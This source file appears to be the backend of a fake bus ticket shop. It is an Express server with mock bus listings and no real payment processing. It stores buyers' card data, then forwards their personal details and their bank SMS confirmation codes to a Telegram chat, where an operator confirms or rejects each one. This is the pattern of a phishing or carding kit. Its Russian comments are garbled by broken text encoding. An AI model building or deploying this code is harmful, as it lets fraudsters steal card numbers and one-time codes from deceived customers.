const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';

// Telegram Bot
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Middleware
app.use(cors({
  origin: [FRONTEND_URL, 'https://*.railway.app', 'http://localhost:3000'],
  credentials: true
}));
app.use(express.json());

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –∑–∞–∫–∞–∑–æ–≤ –≤ –ø–∞–º—è—Ç–∏ (–≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö)
const orders = new Map();
const pendingPayments = new Map();

// –ú–∞—Ä—à—Ä—É—Ç—ã –¥–ª—è –ø–æ–∏—Å–∫–∞ –±–∏–ª–µ—Ç–æ–≤
app.get('/api/search-buses', (req, res) => {
  const { from, to, date } = req.query;
  
  // –ú–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–±—É—Å–æ–≤
  const buses = [
    {
      id: '1',
      from: from,
      to: to,
      date: date,
      departureTime: '08:00',
      arrivalTime: '14:30',
      duration: '6—á 30–º',
      price: 120,
      availableSeats: 15,
      operator: 'PolskiBus'
    },
    {
      id: '2',
      from: from,
      to: to,
      date: date,
      departureTime: '12:15',
      arrivalTime: '18:45',
      duration: '6—á 30–º',
      price: 95,
      availableSeats: 8,
      operator: 'FlixBus'
    },
    {
      id: '3',
      from: from,
      to: to,
      date: date,
      departureTime: '18:30',
      arrivalTime: '01:00+1',
      duration: '6—á 30–º',
      price: 85,
      availableSeats: 22,
      operator: 'Simple Express'
    }
  ];
  
  res.json(buses);
});

// –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–∫–∞–∑–∞
app.post('/api/create-order', (req, res) => {
  const { busId, passengerData } = req.body;
  const orderId = uuidv4();
  
  const order = {
    id: orderId,
    busId,
    passengerData,
    status: 'created',
    createdAt: new Date().toISOString()
  };
  
  orders.set(orderId, order);
  res.json({ orderId, status: 'created' });
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç—ã
app.post('/api/process-payment', async (req, res) => {
  const { orderId, cardData } = req.body;
  
  const order = orders.get(orderId);
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø–ª–∞—Ç–µ–∂–∞
  order.cardData = cardData;
  order.status = 'payment_pending';
  
  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
  const message = `üé´ –ù–æ–≤—ã–π –∑–∞–∫–∞–∑ –±–∏–ª–µ—Ç–∞
üìç –û—Ç: ${order.passengerData.from}
üìç –î–æ: ${order.passengerData.to}
üìÖ –î–∞—Ç–∞: ${order.passengerData.date}
üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${order.passengerData.name}
üìß Email: ${order.passengerData.email}
üì± –¢–µ–ª–µ—Ñ–æ–Ω: ${order.passengerData.phone}
üí≥ –ö–∞—Ä—Ç–∞: **** **** **** ${cardData.number.slice(-4)}
üí∞ –°—É–º–º–∞: ${order.passengerData.price} PLN

Order ID: ${orderId}`;

  try {
    const sentMessage = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –¥–∞–Ω–Ω—ã–µ', callback_data: `confirm_payment_${orderId}` },
            { text: '‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å', callback_data: `reject_payment_${orderId}` }
          ]
        ]
      }
    });
    
    pendingPayments.set(orderId, {
      messageId: sentMessage.message_id,
      status: 'awaiting_confirmation'
    });
    
    res.json({ status: 'payment_sent_to_telegram' });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

// –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –ø–ª–∞—Ç–µ–∂–∞
app.get('/api/payment-status/:orderId', (req, res) => {
  const { orderId } = req.params;
  const order = orders.get(orderId);
  const payment = pendingPayments.get(orderId);
  
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  res.json({ 
    status: order.status,
    paymentStatus: payment?.status || 'unknown'
  });
});

// –û—Ç–ø—Ä–∞–≤–∫–∞ SMS –∫–æ–¥–∞
app.post('/api/send-sms-code', async (req, res) => {
  const { orderId, smsCode } = req.body;
  
  const order = orders.get(orderId);
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  order.smsCode = smsCode;
  order.status = 'sms_pending';
  
  const message = `üì± SMS –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: ${smsCode}
Order ID: ${orderId}`;
  
  try {
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å SMS', callback_data: `confirm_sms_${orderId}` },
            { text: 'üîÑ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–≤—ã–π', callback_data: `resend_sms_${orderId}` }
          ]
        ]
      }
    });
    
    res.json({ status: 'sms_sent_to_telegram' });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ SMS –≤ Telegram:', error);
    res.status(500).json({ error: 'Failed to send SMS to Telegram' });
  }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ callback –æ—Ç Telegram –±–æ—Ç–∞
bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  
  if (data.startsWith('confirm_payment_')) {
    const orderId = data.replace('confirm_payment_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'payment_confirmed';
      bot.editMessageText(message.text + '\n\n‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω—ã!', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  } else if (data.startsWith('reject_payment_')) {
    const orderId = data.replace('reject_payment_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'payment_rejected';
      bot.editMessageText(message.text + '\n\n‚ùå –ü–ª–∞—Ç–µ–∂ –æ—Ç–∫–ª–æ–Ω–µ–Ω!', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  } else if (data.startsWith('confirm_sms_')) {
    const orderId = data.replace('confirm_sms_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'completed';
      bot.editMessageText(message.text + '\n\n‚úÖ SMS –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –ó–∞–∫–∞–∑ –∑–∞–≤–µ—Ä—à–µ–Ω.', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  } else if (data.startsWith('resend_sms_')) {
    const orderId = data.replace('resend_sms_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'sms_resend_requested';
      bot.editMessageText(message.text + '\n\nüîÑ –ó–∞–ø—Ä–æ—à–µ–Ω –Ω–æ–≤—ã–π SMS –∫–æ–¥.', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  }
  
  bot.answerCallbackQuery(callbackQuery.id);
});

app.listen(PORT, () => {
  console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});